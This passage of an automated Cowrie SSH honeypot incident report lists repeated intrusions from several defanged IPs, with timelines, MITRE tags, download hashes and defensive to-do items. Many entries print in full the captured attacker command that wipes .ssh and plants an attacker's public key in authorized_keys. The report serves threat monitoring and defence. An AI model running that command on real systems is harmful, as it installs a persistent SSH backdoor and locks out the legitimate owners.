| `2026-05-25 13:55:59` | `cowrie.login.success` |
| `2026-05-25 13:56:00` | `cowrie.session.params` |
| `2026-05-25 13:56:00` | `cowrie.command.input` |
| `2026-05-25 13:56:00` | `cowrie.command.failed` |
| `2026-05-25 13:56:00` | `cowrie.log.closed` |
| `2026-05-25 13:56:01` | `cowrie.session.params` |
| `2026-05-25 13:56:01` | `cowrie.command.input` |
| `2026-05-25 13:56:01` | `cowrie.session.file_download` |
| `2026-05-25 13:56:01` | `cowrie.log.closed` |
| `2026-05-25 13:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b03425c27a7

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 13:56 |
| **Last Seen** | 2026-05-25 13:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:56:03` | `cowrie.session.connect` |
| `2026-05-25 13:56:03` | `cowrie.client.version` |
| `2026-05-25 13:56:04` | `cowrie.client.kex` |
| `2026-05-25 13:56:05` | `cowrie.login.success` |
| `2026-05-25 13:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ee5ecbdd93c

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 13:59 |
| **Last Seen** | 2026-05-25 13:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:59:47` | `cowrie.session.connect` |
| `2026-05-25 13:59:47` | `cowrie.client.version` |
| `2026-05-25 13:59:47` | `cowrie.client.kex` |
| `2026-05-25 13:59:48` | `cowrie.login.success` |
| `2026-05-25 13:59:49` | `cowrie.session.params` |
| `2026-05-25 13:59:49` | `cowrie.command.input` |
| `2026-05-25 13:59:49` | `cowrie.command.failed` |
| `2026-05-25 13:59:49` | `cowrie.log.closed` |
| `2026-05-25 13:59:49` | `cowrie.session.params` |
| `2026-05-25 13:59:49` | `cowrie.command.input` |
| `2026-05-25 13:59:49` | `cowrie.session.file_download` |
| `2026-05-25 13:59:49` | `cowrie.log.closed` |
| `2026-05-25 13:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3e78440acf6

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 13:59 |
| **Last Seen** | 2026-05-25 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:59:52` | `cowrie.session.connect` |
| `2026-05-25 13:59:52` | `cowrie.client.version` |
| `2026-05-25 13:59:52` | `cowrie.client.kex` |
| `2026-05-25 13:59:53` | `cowrie.login.success` |
| `2026-05-25 13:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf085b98e26

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:07 |
| **Last Seen** | 2026-05-25 14:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:07:00` | `cowrie.session.connect` |
| `2026-05-25 14:07:00` | `cowrie.client.version` |
| `2026-05-25 14:07:00` | `cowrie.client.kex` |
| `2026-05-25 14:07:01` | `cowrie.login.success` |
| `2026-05-25 14:07:02` | `cowrie.session.params` |
| `2026-05-25 14:07:02` | `cowrie.command.input` |
| `2026-05-25 14:07:02` | `cowrie.command.failed` |
| `2026-05-25 14:07:02` | `cowrie.log.closed` |
| `2026-05-25 14:07:02` | `cowrie.session.params` |
| `2026-05-25 14:07:02` | `cowrie.command.input` |
| `2026-05-25 14:07:03` | `cowrie.session.file_download` |
| `2026-05-25 14:07:03` | `cowrie.log.closed` |
| `2026-05-25 14:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40292c7250d6

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:07 |
| **Last Seen** | 2026-05-25 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:07:06` | `cowrie.session.connect` |
| `2026-05-25 14:07:06` | `cowrie.client.version` |
| `2026-05-25 14:07:06` | `cowrie.client.kex` |
| `2026-05-25 14:07:07` | `cowrie.login.success` |
| `2026-05-25 14:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0235a006dd

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:10 |
| **Last Seen** | 2026-05-25 14:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:10:39` | `cowrie.session.connect` |
| `2026-05-25 14:10:39` | `cowrie.client.version` |
| `2026-05-25 14:10:39` | `cowrie.client.kex` |
| `2026-05-25 14:10:40` | `cowrie.login.success` |
| `2026-05-25 14:10:40` | `cowrie.session.params` |
| `2026-05-25 14:10:40` | `cowrie.command.input` |
| `2026-05-25 14:10:40` | `cowrie.command.failed` |
| `2026-05-25 14:10:40` | `cowrie.log.closed` |
| `2026-05-25 14:10:41` | `cowrie.session.params` |
| `2026-05-25 14:10:41` | `cowrie.command.input` |
| `2026-05-25 14:10:41` | `cowrie.session.file_download` |
| `2026-05-25 14:10:41` | `cowrie.log.closed` |
| `2026-05-25 14:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d10f4564bc05

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:10 |
| **Last Seen** | 2026-05-25 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:10:44` | `cowrie.session.connect` |
| `2026-05-25 14:10:44` | `cowrie.client.version` |
| `2026-05-25 14:10:44` | `cowrie.client.kex` |
| `2026-05-25 14:10:45` | `cowrie.login.success` |
| `2026-05-25 14:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-294c983a4e01

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:12 |
| **Last Seen** | 2026-05-25 14:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:12:34` | `cowrie.session.connect` |
| `2026-05-25 14:12:34` | `cowrie.client.version` |
| `2026-05-25 14:12:34` | `cowrie.client.kex` |
| `2026-05-25 14:12:35` | `cowrie.login.success` |
| `2026-05-25 14:12:35` | `cowrie.session.params` |
| `2026-05-25 14:12:35` | `cowrie.command.input` |
| `2026-05-25 14:12:35` | `cowrie.command.failed` |
| `2026-05-25 14:12:35` | `cowrie.log.closed` |
| `2026-05-25 14:12:36` | `cowrie.session.params` |
| `2026-05-25 14:12:36` | `cowrie.command.input` |
| `2026-05-25 14:12:36` | `cowrie.session.file_download` |
| `2026-05-25 14:12:36` | `cowrie.log.closed` |
| `2026-05-25 14:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bc681a3bf54

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:12 |
| **Last Seen** | 2026-05-25 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:12:39` | `cowrie.session.connect` |
| `2026-05-25 14:12:39` | `cowrie.client.version` |
| `2026-05-25 14:12:39` | `cowrie.client.kex` |
| `2026-05-25 14:12:40` | `cowrie.login.success` |
| `2026-05-25 14:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e348f663749

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:16 |
| **Last Seen** | 2026-05-25 14:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:16:17` | `cowrie.session.connect` |
| `2026-05-25 14:16:17` | `cowrie.client.version` |
| `2026-05-25 14:16:17` | `cowrie.client.kex` |
| `2026-05-25 14:16:18` | `cowrie.login.success` |
| `2026-05-25 14:16:18` | `cowrie.session.params` |
| `2026-05-25 14:16:18` | `cowrie.command.input` |
| `2026-05-25 14:16:18` | `cowrie.command.failed` |
| `2026-05-25 14:16:19` | `cowrie.log.closed` |
| `2026-05-25 14:16:19` | `cowrie.session.params` |
| `2026-05-25 14:16:19` | `cowrie.command.input` |
| `2026-05-25 14:16:19` | `cowrie.session.file_download` |
| `2026-05-25 14:16:19` | `cowrie.log.closed` |
| `2026-05-25 14:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86a110f22171

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:16 |
| **Last Seen** | 2026-05-25 14:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:16:22` | `cowrie.session.connect` |
| `2026-05-25 14:16:22` | `cowrie.client.version` |
| `2026-05-25 14:16:22` | `cowrie.client.kex` |
| `2026-05-25 14:16:23` | `cowrie.login.success` |
| `2026-05-25 14:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a891fafe829d

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:18 |
| **Last Seen** | 2026-05-25 14:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:18:07` | `cowrie.session.connect` |
| `2026-05-25 14:18:07` | `cowrie.client.version` |
| `2026-05-25 14:18:07` | `cowrie.client.kex` |
| `2026-05-25 14:18:08` | `cowrie.login.success` |
| `2026-05-25 14:18:09` | `cowrie.session.params` |
| `2026-05-25 14:18:09` | `cowrie.command.input` |
| `2026-05-25 14:18:09` | `cowrie.command.failed` |
| `2026-05-25 14:18:09` | `cowrie.log.closed` |
| `2026-05-25 14:18:09` | `cowrie.session.params` |
| `2026-05-25 14:18:09` | `cowrie.command.input` |
| `2026-05-25 14:18:10` | `cowrie.session.file_download` |
| `2026-05-25 14:18:10` | `cowrie.log.closed` |
| `2026-05-25 14:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-643497150f52

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 14:18 |
| **Last Seen** | 2026-05-25 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:18:12` | `cowrie.session.connect` |
| `2026-05-25 14:18:12` | `cowrie.client.version` |
| `2026-05-25 14:18:13` | `cowrie.client.kex` |
| `2026-05-25 14:18:13` | `cowrie.login.success` |
| `2026-05-25 14:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd084482aae3

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]144` |
| **First Seen** | 2026-05-25 14:22 |
| **Last Seen** | 2026-05-25 14:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:22:54` | `cowrie.session.connect` |
| `2026-05-25 14:22:54` | `cowrie.client.version` |
| `2026-05-25 14:22:54` | `cowrie.client.kex` |
| `2026-05-25 14:22:54` | `cowrie.login.success` |
| `2026-05-25 14:22:54` | `cowrie.session.params` |
| `2026-05-25 14:22:54` | `cowrie.command.input` |
| `2026-05-25 14:22:54` | `cowrie.command.failed` |
| `2026-05-25 14:22:55` | `cowrie.log.closed` |
| `2026-05-25 14:22:55` | `cowrie.session.params` |
| `2026-05-25 14:22:55` | `cowrie.command.input` |
| `2026-05-25 14:22:55` | `cowrie.session.file_download` |
| `2026-05-25 14:22:55` | `cowrie.log.closed` |
| `2026-05-25 14:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f951d397cfda

| Field | Detail |
|---|---|
| **Source IP** | `152.32.130[.]144` |
| **First Seen** | 2026-05-25 14:22 |
| **Last Seen** | 2026-05-25 14:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:22:57` | `cowrie.session.connect` |
| `2026-05-25 14:22:57` | `cowrie.client.version` |
| `2026-05-25 14:22:57` | `cowrie.client.kex` |
| `2026-05-25 14:22:57` | `cowrie.login.success` |
| `2026-05-25 14:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `152.32.130[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542bcb8b969a

| Field | Detail |
|---|---|
| **Source IP** | `47.103.26[.]37` |
| **First Seen** | 2026-05-25 14:52 |
| **Last Seen** | 2026-05-25 14:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 14:52:55` | `cowrie.session.connect` |
| `2026-05-25 14:52:55` | `cowrie.client.version` |
| `2026-05-25 14:52:55` | `cowrie.client.kex` |
| `2026-05-25 14:52:55` | `cowrie.login.success` |
| `2026-05-25 14:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.103.26[.]37` to AbuseIPDB if not already reported
- [ ] Block `47.103.26[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40ee569cf0ed

| Field | Detail |
|---|---|
| **Source IP** | `103.82.21[.]8` |
| **First Seen** | 2026-05-25 15:00 |
| **Last Seen** | 2026-05-25 15:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:00:40` | `cowrie.session.connect` |
| `2026-05-25 15:00:40` | `cowrie.client.version` |
| `2026-05-25 15:00:40` | `cowrie.client.kex` |
| `2026-05-25 15:00:41` | `cowrie.login.success` |
| `2026-05-25 15:00:41` | `cowrie.session.params` |
| `2026-05-25 15:00:41` | `cowrie.command.input` |
| `2026-05-25 15:00:41` | `cowrie.command.failed` |
| `2026-05-25 15:00:41` | `cowrie.log.closed` |
| `2026-05-25 15:00:41` | `cowrie.session.params` |
| `2026-05-25 15:00:41` | `cowrie.command.input` |
| `2026-05-25 15:00:41` | `cowrie.session.file_download` |
| `2026-05-25 15:00:41` | `cowrie.log.closed` |
| `2026-05-25 15:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.21[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.82.21[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
